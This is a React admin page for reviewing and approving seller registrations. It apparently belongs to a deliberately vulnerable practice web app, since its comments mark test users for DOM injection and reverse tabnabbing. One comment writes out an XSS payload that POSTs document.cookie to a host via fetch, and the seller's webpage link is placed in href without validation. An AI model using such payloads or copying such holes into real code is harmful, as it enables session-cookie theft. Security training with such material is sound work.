import HeaderAdmin from "../components/headerAdmin";
import Footer from "../components/footer";
import { useEffect, useState } from "react";
import { Button, Col, Container, Table, Row } from "react-bootstrap";
import CustomModal from "../components/modal";
import { approveRegistration, getPendingUsers, deleteUser } from "../api/users";
import { fromCharArrayToBase64 } from "../utils";

function SellerRegistration() {

    const [tableData, setTableData] = useState([]);
    const [showPopup, setShowPopup] = useState(null);
    const [previewDocument, setPreviewDocument] = useState(null);
    const [isPDF, setIsPDF] = useState(false);
    const [showPreview, setShowPreview] = useState(false);

    const updateTable = () => {
        setPreviewDocument(null);
        getPendingUsers()
            .then((res) => {
                res.json().then((response) => {
                    setTableData([]);
                    for (let i = 0; i < response.length; i++) {
                        const data = {
                            id: response[i].id,
                            username: response[i].username,
                            webpage: response[i].webpage,
                            address: response[i].address, 
                            filename: response[i].filename,
                            document: Array.isArray(response[i].document.data)
                                ? fromCharArrayToBase64(response[i].document.data)
                                : response[i].document
                        }
                        setTableData((tableData => [...tableData, data]));  // this can create problem in network fetch error if there is a strange for example username like for example <audio src=1 onerror="fetch('http://localhost:8080',{method:'POST',body:document.cookie})">
                    }
                });
            })
            .catch(() => {
                setShowPopup("err");
            });
    }

    const allowRegistration = (sellerId) => {
        approveRegistration(sellerId)
            .then(() => {
                updateTable();
                setPreviewDocument(null);
                setShowPopup("all");
            })
            .catch(() => {
                setShowPopup("err");
            });
    }

    const denyRegistration = (sellerId) => {
        deleteUser(sellerId)
            .then(() => {
                updateTable();
                setPreviewDocument(null);
                setShowPopup("den");
            })
            .catch(() => {
                setShowPopup("err");
            });
    }

    useEffect(() => {
        updateTable();
        setPreviewDocument(null);
    }, [])

    const handleModal = () => {
        setShowPopup(null)
    }

    const handleDocumentPreview = (documentData, filename) => {
        console.log("Preview data:", documentData.slice(0, 100));
        console.log("Filename:", filename);
        setPreviewDocument(documentData);
        setIsPDF(filename.toLowerCase().endsWith('.pdf'));
        setShowPreview(true);
    }

    const handleDocumentDownload = (documentData, filename) => {

        function base64ToArrayBuffer(base64) {
            var binaryString = window.atob(base64);
            var binaryLen = binaryString.length;
            var bytes = new Uint8Array(binaryLen);
            for (var i = 0; i < binaryLen; i++) {
                var ascii = binaryString.charCodeAt(i);
                bytes[i] = ascii;
            }
            return bytes;
        }
        function saveByteArray(reportName, byte) {
            var blob = new Blob([byte]);
            var link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            var fileName = reportName;
            link.download = fileName;
            link.click();
        };

        const sampleArr = base64ToArrayBuffer(documentData);
        saveByteArray(filename, sampleArr);
    }

    const SellerRow = (props) => {
        return (
            <>
                <tr>
                    <td>{props.seller.id}</td>
                    <td>{props.seller.username}</td>

                    {/* Reflected DOM Injection (test with user "sellertest") */}
                    {/* Reverse Tabnabbing with rel="opener" (test with user "hacker") */}
                    <td>{props.seller.webpage ? <Button as="a" href={props.seller.webpage} target="_blank" rel="noopener">Open</Button> : "N/A"} </td>

                    <td>{props.seller.address}</td> 
                    <td>
                        <Button className="mx-1" onClick={() => handleDocumentPreview(props.seller.document, props.seller.filename)}>Preview</Button>
                        <Button className="mx-1" variant="secondary" onClick={() => handleDocumentDownload(props.seller.document, props.seller.filename)}>Download</Button>
                    </td>
                    <td>
                        <Button className="mx-1" onClick={() => allowRegistration(props.seller.id)} variant="success">Approve</Button>
                        <Button className="mx-1" onClick={() => denyRegistration(props.seller.id)} variant="danger">Deny</Button>
                    </td>
                </tr>
            </>
        );
    }

    return (
        <>
            <HeaderAdmin />

            <Container fluid className="py-3">
                <Row>
                    <Col xs={12} className="mb-3 text-center">
                        <Button onClick={updateTable}>Update table</Button>
                    </Col>
                </Row>
                <Row>
                    <Col md={showPreview ? 7 : 12}>
                        <Table responsive striped bordered hover>
                            <thead>
                                <tr>
                                    <th>Seller ID</th>
                                    <th>Username</th>
                                    <th>Web Page</th>
                                    <th>Address</th>
                                    <th>Document</th>
                                    <th>Tools</th>
                                </tr>
                            </thead>
                            <tbody>
                                {tableData.map((seller) => <SellerRow key={seller.id} seller={seller} />)}
                            </tbody>
                        </Table>
                    </Col>
                    {showPreview && (
                        <Col md={5}>
                            <div className="border p-3 h-100">
                                <h4 className="mb-3">Document Preview</h4>
                                {previewDocument ? (
                                    isPDF ? (
                                        <embed src={`data:application/pdf;base64,${previewDocument}`} type="application/pdf" width="100%" height="600px" />
                                    ) : (
                                        <pre style={{ whiteSpace: 'pre-wrap', wordWrap: 'break-word', maxHeight: '600px', overflow: 'auto', backgroundColor: '#f8f9fa', padding: '10px', border: '1px solid #dee2e6', borderRadius: '4px' }}>
                                            {previewDocument}
                                        </pre>
                                    )
                                ) : (
                                    <p className="text-muted">No document selected for preview</p>
                                )}
                            </div>
                        </Col>
                    )}
                </Row>
            </Container>

            <CustomModal
                isOpen={showPopup !== null}
                title={showPopup === "all" ? "Registration allowed" : (showPopup === "den" ? "Registration denied" : "Error!")}
                body={showPopup === "all" ? "You have successfully registered the seller" : (showPopup === "den" ? "You have successfully denied the seller registration" : "Something went wrong")}
                buttons={["Close"]} onClose={handleModal}
            />

            <Footer />
        </>
    );
}
export default SellerRegistration;